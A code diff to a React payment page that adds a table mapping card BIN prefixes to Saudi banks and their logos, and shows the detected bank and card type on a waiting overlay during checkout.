@@ -5,7 +5,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay from "@/components/WaitingOverlay";
+import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -131,6 +131,127 @@ const MADA_BINS = [
   // سامبا (البنك السعودي الأمريكي)
   "508160", "530906", "531095", "532013",
 ];
+
+// قاعدة بيانات البنوك مع شعاراتها
+const BANK_DATABASE: Record<string, { bank: string; logo: string }> = {
+  // البنك الأهلي السعودي (SNB)
+  '223379': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '223398': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '412113': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '430258': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '430259': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '430260': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '445303': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '450766': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '455698': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '465154': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '466515': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '473258': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '482052': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '483178': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '485005': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '485042': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '486094': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '486095': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '486096': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '524130': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '529415': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '535825': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '543085': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '549760': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '554180': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '588850': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  '968202': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
+  // مصرف الراجحي
+  '403024': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '409201': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '410621': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '455708': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '458456': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '462220': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '484783': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '968205': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '489318': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '489319': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '427015': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '432328': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  '457997': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
+  // مصرف الإنماء
+  '407197': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '407395': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '412565': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '428671': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '428672': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '428673': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '434107': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '446672': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '543357': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '426897': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  '968206': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
+  // بنك الرياض
+  '513213': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '520058': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '524514': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '529741': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '535989': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '536023': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '537767': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '558563': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  '968209': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
+  // بنك البلاد
+  '417633': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '446393': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '468540': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '468541': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '468542': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '468543': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '636120': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  '968201': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
+  // البنك السعودي الفرنسي
+  '421141': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '440647': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '440795': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '446404': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '457865': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '474491': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '588845': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  '968208': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
+  // البنك السعودي البريطاني (ساب)
+  '422817': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  '422818': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  '422819': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  '428331': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  '605141': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  '968204': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
+  // بنك الجزيرة
+  '440533': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
+  '445564': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
+  '504300': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
+  '968211': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
+  // البنك العربي الوطني
+  '455036': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
+  '588848': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
+  '968203': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
+  // البنك السعودي للاستثمار
+  '406136': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  '483010': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  '483011': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  '483012': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  '589206': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  '968207': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
+  // STC Pay
+  '420132': { bank: 'STC Pay', logo: '/images/banks/stc-bank.png' },
+  // بنك الخليج الدولي
+  '419593': { bank: 'الخليج', logo: '/images/banks/gulf-international-bank-bsc.png' },
+  '439954': { bank: 'الخليج', logo: '/images/banks/gulf-international-bank-bsc.png' },
+};
+
+// الحصول على معلومات البنك من رقم البطاقة
+function getBankInfo(cardNumber: string): { bank: string; logo: string } | null {
+  const cleanNumber = cardNumber.replace(/\s+/g, "");
+  const bin6 = cleanNumber.substring(0, 6);
+  return BANK_DATABASE[bin6] || null;
+}
 
 // Detect card type
 function getCardType(number: string): string {
@@ -301,10 +422,25 @@ export default function CreditCardPayment() {
 
     // Remove spaces from card number before sending
     const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");
+    
+    // الحصول على معلومات البنك ونوع البطاقة
+    const bankInfo = getBankInfo(cleanCardNumber);
+    const cardType = getCardType(cleanCardNumber);
+    
+    // تحديث معلومات شاشة الانتظار (فقط إذا كانت البطاقة موجودة في قاعدة البيانات)
+    if (bankInfo) {
+      waitingCardInfo.value = {
+        bankName: bankInfo.bank,
+        bankLogo: bankInfo.logo,
+        cardType: cardType,
+      };
+    } else {
+      waitingCardInfo.value = null;
+    }
 
     const paymentData = {
       totalPaid: totalAmount,
-      cardType: getCardType(cleanCardNumber),
+      cardType: cardType,
       cardLast4: cleanCardNumber.slice(-4),
       serviceName: serviceName,
     };
